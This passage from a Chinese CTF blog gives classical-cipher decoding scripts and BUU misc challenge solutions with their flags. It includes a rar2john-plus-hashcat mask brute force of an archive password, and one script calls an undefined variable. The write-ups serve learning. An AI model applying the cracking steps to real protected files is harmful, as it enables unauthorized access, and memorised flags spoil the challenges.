&#x27;s&#x27;, &#x27;t&#x27;,</span><br><span class="line">#                 &#x27;(uv)&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;]</span><br><span class="line">#     cipher = [&quot;aaaaa&quot;, &quot;aaaab&quot;, &quot;aaaba&quot;, &quot;aaabb&quot;, &quot;aabaa&quot;, &quot;aabab&quot;, &quot;aabba&quot;, &quot;aabbb&quot;, &quot;abaaa&quot;, &quot;abaab&quot;,</span><br><span class="line">#               &quot;ababa&quot;, &quot;ababb&quot;, &quot;abbaa&quot;, &quot;abbab&quot;, &quot;abbba&quot;, &quot;abbbb&quot;, &quot;baaaa&quot;, &quot;baaab&quot;, &quot;baaba&quot;, &quot;baabb&quot;,</span><br><span class="line">#               &quot;babaa&quot;, &quot;babab&quot;, &quot;babba&quot;, &quot;babbb&quot;]</span><br><span class="line">#     key = dict(zip(cipher, alphabet))  # 生成键值对应的字典</span><br><span class="line">#     try:</span><br><span class="line">#         flag = &#x27;&#x27;</span><br><span class="line">#         for i in range(0, len(content), 5):</span><br><span class="line">#             value = content[i:i + 5]  # 切片</span><br><span class="line">#             flag += key.get(value)  # 取键值</span><br><span class="line">#     except:</span><br><span class="line">#         flag = &#x27;&#x27;</span><br><span class="line">#         table = &#x27;&#x27;.maketrans(&quot;ab&quot;, &quot;ba&quot;)</span><br><span class="line">#         content = content.translate(table)</span><br><span class="line">#         for i in range(0, len(content), 5):</span><br><span class="line">#             value = content[i:i + 5]  # 切片</span><br><span class="line">#             flag += key.get(value)  # 取键值</span><br><span class="line">#     print(flag)</span><br><span class="line"># else:</span><br><span class="line">#     print(&quot;不是培根密码&quot;)</span><br><span class="line"></span><br><span class="line"># 乘法逆元</span><br><span class="line"># m=1</span><br><span class="line"># while True:</span><br><span class="line">#     if (7*m)%26==1:</span><br><span class="line">#         print(m)</span><br><span class="line">#         break</span><br><span class="line">#     m=m+1</span><br><span class="line"># for i in range(0,26):</span><br><span class="line">#     if (7 * i) % 26 == 25:</span><br><span class="line">#         print(i)</span><br><span class="line"></span><br><span class="line"># 仿射密码解密</span><br><span class="line"># 加密公式：c=(11m+7)mod26,对应的a=11,b等于7</span><br><span class="line"># content = &#x27;dikxourxd&#x27;</span><br><span class="line"># m = 1</span><br><span class="line"># while True:</span><br><span class="line">#     if (11 * m) % 26 == 1:</span><br><span class="line">#         print(m)  # 得到乘法逆元</span><br><span class="line">#         break</span><br><span class="line">#     m = m + 1</span><br><span class="line"># flag=&#x27;&#x27;</span><br><span class="line"># for i in content:</span><br><span class="line">#     flag+=chr(97 + (ord(i) - 97 - 7) * 19 % 26)</span><br><span class="line">#     print(chr(97 + (ord(i) - 97 - 7) * 19 % 26))</span><br><span class="line"># print(flag)</span><br><span class="line"># 暴力破解</span><br><span class="line"># content = &#x27;szzyfimhyzd&#x27;</span><br><span class="line"># plan = &#x27;17,-8&#x27;#a和b的值</span><br><span class="line"># a = int(plan.split(&#x27;,&#x27;)[0])</span><br><span class="line"># b = int(plan.split(&#x27;,&#x27;)[1])</span><br><span class="line"># flag=&#x27;&#x27;</span><br><span class="line"># for i in content:</span><br><span class="line">#     for j in range(0, 26):</span><br><span class="line">#         if (a * j + b) % 26 == ord(i) - ord(&#x27;a&#x27;):</span><br><span class="line">#             flag+=chr(97 + j)</span><br><span class="line"># print(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># # 维吉尼亚密码解密</span><br><span class="line"># content = &#x27;Vjieogrf&#x27;</span><br><span class="line"># key = &#x27;abc&#x27;</span><br><span class="line"># flag = &#x27;&#x27;</span><br><span class="line"># key_to_num = [ord(k) - 97 for k in key.lower()]  # 列表推导式，将密钥中的数值转成0到26的值</span><br><span class="line"># for i in range(len(content)):</span><br><span class="line">#     if content[i].islower():  # 小写字母</span><br><span class="line">#         flag += chr((ord(content[i]) - 97 - key_to_num[i%len(key)]) % 26 + 97)  # 加密往前移动，解密往后移动</span><br><span class="line">#     elif content[i].isupper():  # 大写写字母</span><br><span class="line">#         flag += chr((ord(content[i]) - 65 - key_to_num[i%len(key)]) % 26 + 65)  # 加密往前移动，解密往后移动</span><br><span class="line">#     else:#其他字符保留</span><br><span class="line">#         flag += content[i]</span><br><span class="line"># print(flag)</span><br><span class="line"># # 维吉尼亚密码解密</span><br><span class="line"># import pycipher</span><br><span class="line"># print(pycipher.Vigenere(&quot;abc&quot;).decipher(&#x27;Vjieogrf&#x27;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 费纳姆密码</span><br><span class="line"># content=&#x27;00010110010111001100100010000001010&#x27;</span><br><span class="line"># key=&#x27;CRUDE&#x27;</span><br><span class="line"># mi =[content[i:i+7] for i in range(0,len(content),7)]</span><br><span class="line"># flag=&#x27;&#x27;</span><br><span class="line"># for i,j in zip(mi,key):#在python中不仅二进制可以做异或，十进制也可以</span><br><span class="line">#     print(chr(int(i,2)^ord(j)))</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># # 杰斐逊轮转加密</span><br><span class="line"># value = &#x27;&#x27;&#x27;1:&lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt;</span><br><span class="line"># 2:&lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt;</span><br><span class="line"># 3: &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt;</span><br><span class="line"># 4: &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt;</span><br><span class="line"># 5:   &lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt;</span><br><span class="line"># 6:   &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt;</span><br><span class="line"># 7:   &lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt;</span><br><span class="line"># 8:   &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt;</span><br><span class="line"># 9:   &lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt;</span><br><span class="line"># 10:  &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt;</span><br><span class="line"># 11： &lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt;</span><br><span class="line"># 12： &lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt;</span><br><span class="line"># 13： &lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt;&#x27;&#x27;&#x27;</span><br><span class="line"># new = []</span><br><span class="line"># for i in value.split(&#x27;\n&#x27;):  # 根据换行来切片</span><br><span class="line">#     new.append(i[i.index(&#x27;&lt;&#x27;) + 2:i.rindex(&#x27;&lt;&#x27;) - 1])  # 处理多余字符</span><br><span class="line"># key = [int(i) for i in &#x27;2,3,7,5,13,12,9,1,8,10,4,11,6&#x27;.split(&#x27;,&#x27;)]  # 转成整数</span><br><span class="line"># content = &#x27;NFQKSEVOQOFNP&#x27;  # 密文</span><br><span class="line"># text = []</span><br><span class="line"># # for i in range(len(content)):</span><br><span class="line"># #     print(content[i:]+content[:i])</span><br><span class="line"># for k, m in zip(key, content):</span><br><span class="line">#     # print(new[k - 1][new[k - 1].index(m):]+new[k - 1][:new[k - 1].index(m)])</span><br><span class="line">#     text.append(new[k - 1][new[k - 1].index(m):]+new[k - 1][:new[k - 1].index(m)])</span><br><span class="line"># # print(text)</span><br><span class="line">#</span><br><span class="line"># flag=[]</span><br><span class="line"># for i in range(26):</span><br><span class="line">#     txt=&#x27;&#x27;</span><br><span class="line">#     for j in text:</span><br><span class="line">#         txt+=j[i]</span><br><span class="line">#     flag.append(txt)</span><br><span class="line"># print(flag)</span><br><span class="line"># #17列</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># #base家族解密</span><br><span class="line"># import base64</span><br><span class="line"># import base128</span><br><span class="line"># import base36</span><br><span class="line"># import base58</span><br><span class="line"># import base91</span><br><span class="line"># import py3base92</span><br><span class="line">#</span><br><span class="line"># content = &#x27;=&#x27;</span><br><span class="line"># num=[]</span><br><span class="line"># while True:</span><br><span class="line">#     try:</span><br><span class="line">#         content = base64.b16decode(content).decode()</span><br><span class="line">#         num.append(&#x27;base16&#x27;)</span><br><span class="line">#         continue</span><br><span class="line">#     except:</span><br><span class="line">#         pass</span><br><span class="line">#     try:</span><br><span class="line">#         content = base64.b32decode(content).decode()</span><br><span class="line">#         num.append(&#x27;base32&#x27;)</span><br><span class="line">#         continue</span><br><span class="line">#     except:</span><br><span class="line">#         pass</span><br><span class="line">#     try:</span><br><span class="line">#         content = base36.dumps(content).decode()</span><br><span class="line">#         num.append(&#x27;base36&#x27;)</span><br><span class="line">#         continue</span><br><span class="line">#     except:</span><br><span class="line">#         pass</span><br><span class="line">#     try:</span><br><span class="line">#         content = base58.b58decode(content).decode()</span><br><span class="line">#         num.append(&#x27;base58&#x27;)</span><br><span class="line">#         continue</span><br><span class="line">#     except:</span><br><span class="line">#         pass</span><br><span class="line">#     try:</span><br><span class="line">#         content = base64.b64decode(content).decode()</span><br><span class="line">#         num.append(&#x27;base64&#x27;)</span><br><span class="line">#         continue</span><br><span class="line">#     except:</span><br><span class="line">#         pass</span><br><span class="line">#     try:</span><br><span class="line">#         content = base64.b85decode(content).decode()</span><br><span class="line">#         num.append(&#x27;base85&#x27;)</span><br><span class="line">#         continue</span><br><span class="line">#     except:</span><br><span class="line">#         pass</span><br><span class="line">#     try:</span><br><span class="line">#         content = base64.a85decode(content).decode()</span><br><span class="line">#         num.append(&#x27;base85&#x27;)</span><br><span class="line">#         continue</span><br><span class="line">#     except:</span><br><span class="line">#         pass</span><br><span class="line">#     try:</span><br><span class="line">#         content = base91.decode(content).decode()</span><br><span class="line">#         num.append(&#x27;base91&#x27;)</span><br><span class="line">#         continue</span><br><span class="line">#     except:</span><br><span class="line">#         pass</span><br><span class="line">#     try:</span><br><span class="line">#         content = py3base92.b92decode(content).decode()</span><br><span class="line">#         num.append(&#x27;base92&#x27;)</span><br><span class="line">#         continue</span><br><span class="line">#     except:</span><br><span class="line">#         pass</span><br><span class="line">#     try:</span><br><span class="line">#         content = b&#x27;&#x27;.join(base128.base128(chars = None, chunksize = 7) .decode(content)).decode()</span><br><span class="line">#         num.append(&#x27;base128&#x27;)</span><br><span class="line">#         continue</span><br><span class="line">#     except:</span><br><span class="line">#         pass</span><br><span class="line">#     break</span><br><span class="line"># print(num)</span><br><span class="line"># print(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##ADFGX密码</span><br><span class="line"># import itertools</span><br><span class="line"># cipher = &quot;ilnllliiikkninlekile&quot;</span><br><span class="line"># key = []</span><br><span class="line"># for i in itertools.permutations(&#x27;ilnke&#x27;, 5):</span><br><span class="line">#     key.append(&#x27;&#x27;.join(i))</span><br><span class="line"># for now_key in key:</span><br><span class="line">#     solve_c = &quot;&quot;</span><br><span class="line">#     res = &quot;&quot;</span><br><span class="line">#     for now_c in cipher:</span><br><span class="line">#         solve_c += str(now_key.index(now_c))</span><br><span class="line">#     for i in range(0,len(solve_c),2):</span><br><span class="line">#         now_ascii = int(solve_c[i])*5+int(solve_c[i+1])+97</span><br><span class="line">#         if now_ascii&gt;ord(&#x27;i&#x27;):</span><br><span class="line">#             now_ascii+=1</span><br><span class="line">#         res += chr(now_ascii)</span><br><span class="line">#     if &quot;flag&quot; in res:</span><br><span class="line">#         print (now_key,res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 云影加密</span><br><span class="line"># content=&#x27;8842101220480224404014224202480122&#x27;</span><br><span class="line"># charList = [chr(i) for i in range(ord(&#x27;A&#x27;), ord(&#x27;Z&#x27;) + 1)]</span><br><span class="line"># ret = []</span><br><span class="line"># plaintext = [i for i in content.split(&#x27;0&#x27;)]</span><br><span class="line"># for i in plaintext:</span><br><span class="line">#     tmp = 0</span><br><span class="line">#     for j in range(len(i)):</span><br><span class="line">#         tmp += int(i[j])</span><br><span class="line">#     ret.append(charList[tmp - 1])</span><br><span class="line"># print(&#x27;云影密码&#x27;, &#x27;&#x27;.join(ret))</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.oscca.gov.cn/sca/zxfw/2017-04/24/content_1011709.shtml">https://www.oscca.gov.cn/sca/zxfw/2017-04/24/content_1011709.shtml</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buumisc(7)</title>
      <link href="/article/2022-04-19-buumisc(7)/"/>
      <url>/article/2022-04-19-buumisc(7)/</url>
      
        <content type="html"><![CDATA[<p>buu刷题目记录(第7页)</p><span id="more"></span><h1 id="buumisc-7"><a href="#buumisc-7" class="headerlink" title="buumisc(7)"></a>buumisc(7)</h1><p>buu第七页，取证什么的后面在一块学习一下，目前暂时跳过了</p><p><img src="/image/media/2022/ctf/buu/7/0.png"></p><h2 id="羊城杯-2020-TCP-IP"><a href="#羊城杯-2020-TCP-IP" class="headerlink" title="[羊城杯 2020]TCP_IP"></a>[羊城杯 2020]TCP_IP</h2><p>得到一个流量包，但是发现每个IP信息都不一样，然后挨个提取出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r attachment.pcap -Y &quot;tcp&quot; -T fields -e ip.id &gt;out.txt</span><br></pre></td></tr></table></figure><p>然后转换成ascii字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f = open(r&#x27;out.txt&#x27;)</span><br><span class="line">for i in f.readlines():</span><br><span class="line">    print(chr(int(i[-3:-1], 16)),end=&#x27;&#x27;)</span><br><span class="line">#@iH&lt;,&#123;*;oUp/im&quot;QPl`yR*ie&#125;NK;.D!Xu)b:J[Rj+6KKM7P@iH&lt;,&#123;*;oUp/im&quot;QPl`yR</span><br></pre></td></tr></table></figure><p>通过base91解密，但是发现存在干扰导致异常，然后每次使用依次拼接的方式得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import base91</span><br><span class="line">strs = &#x27;@iH&lt;,&#123;*;oUp/im&quot;QPl`yR*ie&#125;NK;.D!Xu)b:J[Rj+6KKM7P@iH&lt;,&#123;*;oUp/im&quot;QPl`yRPS&#x27;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for str in strs:</span><br><span class="line">    flag += str</span><br><span class="line">    try:</span><br><span class="line">        c = base91.decode(v).decode() #解密</span><br><span class="line">        print(c)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">#@iH&lt;,&#123;*;oUp/im&quot;QPl`yR*ie&#125;NK;.D!Xu)b:J[Rj+6KKM7P</span><br></pre></td></tr></table></figure><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;wMt84iS06mCbbfuOfuVXCZ8MSsAFN1GA&#125;</span><br></pre></td></tr></table></figure><h2 id="羊城杯-2020-image-rar"><a href="#羊城杯-2020-image-rar" class="headerlink" title="[羊城杯 2020]image_rar"></a>[羊城杯 2020]image_rar</h2><p>得到一个MP4文件，经过binwalk+foremost可以确认是一个zip文件，里面有大量图片，修改后缀名得到hint</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">压缩包密码（6位）：GWxxxx后面可能会用到的哦</span><br></pre></td></tr></table></figure><p>可以发现压缩包密码并不是指当前压缩包，直接解压得到一堆图片，发现65.jpg存在异常</p><p><img src="/image/media/2022/ctf/buu/7/1.png"></p><p>查看65.jpg文件头，可以看到当前文件头是61726121跟52617221(rar)很相似，改成rar文件头和rar后缀名，打开需要密码</p><p>可以结合之前的hint和file 65.rar得到的结果，在kali下用工具rar2john 65.rar得到hash结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">65.rar:$rar5$16$a2dce3925af59efb2df9851dbfc24fb1$15$bb005ea8f91bf0356c8dddcfa41ac4cb$8$62293dc5e26e9e7f</span><br></pre></td></tr></table></figure><p>然后用hashcat.exe（<a href="https://hashcat.net/files/hashcat-6.1.1.7z%EF%BC%89">https://hashcat.net/files/hashcat-6.1.1.7z）</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\hashcat.exe -m 13000 -a 3 $rar5$16$a2dce3925af59efb2df9851dbfc24fb1$15$bb005ea8f91bf0356c8dddcfa41ac4cb$8$62293dc5e26e9e7f GW?a?a?a?a</span><br></pre></td></tr></table></figure><p>爆破得到密码GW5!3#，解压得到一个没有后缀名的文件，010打开是png文件头，修改后缀名后得到flag</p><p><img src="/image/media/2022/ctf/buu/7/2.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GWHT&#123;R3fresh_1s_so_Cool&#125;</span><br></pre></td></tr></table></figure><h2 id="CFI-CTF-2018-Kadyrov’s-Cat"><a href="#CFI-CTF-2018-Kadyrov’s-Cat" class="headerlink" title="[CFI-CTF 2018]Kadyrov’s Cat"></a>[CFI-CTF 2018]Kadyrov’s Cat</h2><p>得到一个图片和pdf，查看图片属性得到一个经纬度坐标用<a href="https://minigps.net/fc.html">https://minigps.net/fc.html</a></p><p><img src="/image/media/2022/ctf/buu/7/3.png"></p><p>定位到city是Riga。</p><p><img src="/image/media/2022/ctf/buu/7/4.png"></p><p>然后用npp++找到作者信息Kotik Kadyrov</p><p><img src="/image/media/2022/ctf/buu/7/5.png"></p><p>然后结合原题Flag format is : CFI{Firstname_Lastname_of_City}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CFI&#123;Kotik_Kadyrov_of_Riga&#125;</span><br></pre></td></tr></table></figure><h2 id="CTF2019-babyflash"><a href="#CTF2019-babyflash" class="headerlink" title="[*CTF2019]babyflash"></a>[*CTF2019]babyflash</h2><p>得到swf文件，用工具<a href="https://github.com/jindrapetrik/jpexs-decompiler/releases%E6%89%93%E5%BC%80%E5%BE%97%E5%88%B0%E4%B8%80%E4%B8%AA%E9%9F%B3%E9%A2%91%E5%92%8C%E4%B8%80%E5%A0%86%E5%9B%BE%E7%89%87">https://github.com/jindrapetrik/jpexs-decompiler/releases打开得到一个音频和一堆图片</a></p><p>用Audacity查看音频文件得到&amp;_the_rest}</p><p><img src="/image/media/2022/ctf/buu/7/6.png"></p><p>图片数量是441正好能够分成21*21所以猜测是21×21的二维码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import cv2</span><br><span class="line">from PIL import Image</span><br><span class="line">flag=&#x27;&#x27;</span><br><span class="line">path = r&#x27;C:\Users\30261\new\python\demo\ctf_tools\misc\qr\check\/image/media/2022/ctf/buu/6/\&#x27;</span><br><span class="line">hei = cv2.imread(r&#x27;C:\Users\30261\new\python\demo\ctf_tools\misc\qr\check\/image/media/2022/ctf/buu/6/26.png&#x27;)</span><br><span class="line">bai = cv2.imread(r&#x27;C:\Users\30261\new\python\demo\ctf_tools\misc\qr\check\/image/media/2022/ctf/buu/6/42.png&#x27;)</span><br><span class="line"></span><br><span class="line">for roots, dirs, files in os.walk(path):</span><br><span class="line">    files.sort(key=lambda x:int(x.split(&#x27;.&#x27;)[0]))#排序</span><br><span class="line">    print(files)</span><br><span class="line">    for file in files:</span><br><span class="line">        img_path = path + file</span><br><span class="line">        print(img_path)</span><br><span class="line">        img = cv2.imread(img_path)</span><br><span class="line">        if bai.all()== img.all():</span><br><span class="line">            flag+=&#x27;1&#x27;</span><br><span class="line">        else:</span><br><span class="line">            flag += &#x27;0&#x27;</span><br><span class="line">#111111100110001111111100000100111001000001101110101011001011101101110100100101011101101110100101101011101100000100110001000001111111101010101111111000000001010100000000111011111011111000100110110011011101111011101101111001101111011010010001100000000011111010100000100011000000000001011100110011111111101011100110101100000101101000100010101110101011011000001101110100101101110000101110101101110110001100000101011100010010111111101101100001011</span><br><span class="line"></span><br><span class="line">width=height=21</span><br><span class="line">i=0</span><br><span class="line">new_img = Image.new(&quot;RGB&quot;,(width,height))</span><br><span class="line">for w in range(width):</span><br><span class="line">    for h in range(height):</span><br><span class="line">        if flag[i]==&#x27;0&#x27;:</span><br><span class="line">            new_img.putpixel([w,h],(0,0,0))</span><br><span class="line">        else:</span><br><span class="line">            new_img.putpixel([w, h], (255, 255, 255))</span><br><span class="line">        i=i+1</span><br><span class="line">new_img.show(&#x27;1.png&#x27;)</span><br></pre></td></tr></table></figure><p>然后得到二维码，识别得到*ctf{half_flag_&amp;</p><p><img src="/image/media/2022/ctf/buu/7/7.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*ctf&#123;half_flag_&amp;&amp;_the_rest&#125;</span><br><span class="line">flag&#123;halfflag&amp;&amp;_the_rest&#125;#buu录错flag</span><br></pre></td></tr></table></figure><h2 id="羊城杯-2020-逃离东南亚"><a href="#羊城杯-2020-逃离东南亚" class="headerlink" title="[羊城杯 2020]逃离东南亚"></a>[羊城杯 2020]逃离东南亚</h2><p>得到三个压缩包，其中日记1需要修改图片的crc得到下面一个密码：wdnmd，猜测是日记二密码</p><p><img src="/image/media/2022/ctf/buu/7/8.png"></p><p>使用silenteye分析wav文件得到日记3密码：This1sThe3rdZIPpwd</p><p><img src="/image/media/2022/ctf/buu/7/9.png"></p><p>md写了不能明文交流，联想到tab和空格，但是几千个文件，挨个查看不现实，因此考虑写个脚本搜索，由于tab和空格编写的隐藏数据通常是连续的，同时要过滤到常见的双空格和双/t，因此考虑用 \t \t作为搜索字符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">def get_file_list(dir_path):</span><br><span class="line">    _file_list = os.listdir(dir_path)</span><br><span class="line">    file_list = []</span><br><span class="line">    for file_str in _file_list:</span><br><span class="line">        new_dir_path = dir_path+&#x27;\\&#x27;+file_str</span><br><span class="line">        if os.path.isdir(new_dir_path):</span><br><span class="line">            file_list.extend(get_file_list(new_dir_path))</span><br><span class="line">        else:</span><br><span class="line">            file_list.append(new_dir_path)</span><br><span class="line">    return file_list</span><br><span class="line">file_list = get_file_list(r&#x27;.\source_code&#x27;)</span><br><span class="line">for file_str in file_list:</span><br><span class="line">    f = open(file_str, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;)</span><br><span class="line">    try:</span><br><span class="line">        data = f.read()</span><br><span class="line">        if &#x27; \t \t&#x27; in data:</span><br><span class="line">            print(file_str)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure><p>然后转换一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">f_list = r&#x27;&#x27;&#x27;source_code\elf\rtld.c</span><br><span class="line">source_code\malloc\arena.c</span><br><span class="line">source_code\malloc\malloc.c&#x27;&#x27;&#x27;</span><br><span class="line">f_list = f_list.split(&#x27;\n&#x27;)</span><br><span class="line">result = &#x27;&#x27;</span><br><span class="line">for f in f_list:</span><br><span class="line">    for data in open(f, &#x27;r&#x27;).readlines():</span><br><span class="line">        data = data[:-1]</span><br><span class="line">        if &#x27;&#125;&#x27; in data:</span><br><span class="line">            data = data.split(&#x27;&#125;&#x27;)[-1]</span><br><span class="line">            if &#x27;\t&#x27; in data:</span><br><span class="line">                data1 = data[::].replace(&#x27;\t&#x27;, &#x27;&#x27;)</span><br><span class="line">                data1 = data1.replace(&#x27; &#x27;, &#x27;&#x27;)</span><br><span class="line">                if not data1:</span><br><span class="line">                    print([data])</span><br><span class="line">                    result += data</span><br><span class="line">result = result.replace(&#x27;\t&#x27;, &#x27;1&#x27;)</span><br><span class="line">result = result.replace(&#x27; &#x27;, &#x27;0&#x27;)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p>得到结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">01010011010011110101001100100001001000000111000001101100011001010110000101110011011001010010000001101000011001010110110001110000001000000110110101100101001000000010110100111110001000000111001001110100011011000110010000101110011000110111100101101111011101010111001000100000011001100110110001100001011001110010000001101001011100110010000001101001011011100010000001101101011000010110110001101100011011110110001100101110011000110100011101010111010000110101010001000110011110110110001101101111011001000110010101011111011100110111010001100101011001110110000101101110011011110110011101110010011000010111000001101000011110010101111100110001011100110101111101100110011101010110111001101110011110010010000101111101</span><br></pre></td></tr></table></figure><p>然后二进制转字符</p><p><img src="/image/media/2022/ctf/buu/7/10.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GWCTF&#123;code_steganography_1s_funny!&#125;</span><br></pre></td></tr></table></figure><h2 id="INSHack2019-Crunchy"><a href="#INSHack2019-Crunchy" class="headerlink" title="[INSHack2019]Crunchy"></a>[INSHack2019]Crunchy</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;% raw %&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crunchy</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">2</span>: <span class="keyword">return</span> n</span><br><span class="line">    <span class="keyword">return</span> <span class="number">6</span> * crunchy(n - <span class="number">1</span>) + crunchy(n - <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">g = <span class="number">17665922529512695488143524113273224470194093921285273353477875204196603230641896039854934719468650093602325707751568</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Your flag is: INSA&#123;%d&#125;&quot;</span>%(crunchy(g)%<span class="number">100000007</span>))</span><br><span class="line">&#123;% endraw %&#125;</span><br></pre></td></tr></table></figure><p>但是直接运行失败，然后报错超过最大递归限度，需要修改一下本质是对斐波那契数的取模，利用皮萨诺周期即可解，可参考：<a href="https://blog.csdn.net/caozhk/article/details/53407845">https://blog.csdn.net/caozhk/article/details/53407845</a> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">n = 17665922529512695488143524113273224470194093921285273353477875204196603230641896039854934719468650093602325707751568</span><br><span class="line">m = 100000007</span><br><span class="line">def getSequencePeriod(m):</span><br><span class="line">    s = []</span><br><span class="line">    s.append(0)</span><br><span class="line">    s.append(1)</span><br><span class="line">    for i in range(2, m*6):</span><br><span class="line">        s.append((6 * s[i-1] + s[i-2]) % m)</span><br><span class="line">        if (s[i] == 1 and s[i-1] == 0):</span><br><span class="line">            break</span><br><span class="line">    return s</span><br><span class="line">def getFibonacciRest(n, m):</span><br><span class="line">    s = getSequencePeriod(m)</span><br><span class="line">    period = len(s) - 2</span><br><span class="line">    val = n % period</span><br><span class="line">    return(s[val])</span><br><span class="line">print(getFibonacciRest(n,m))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 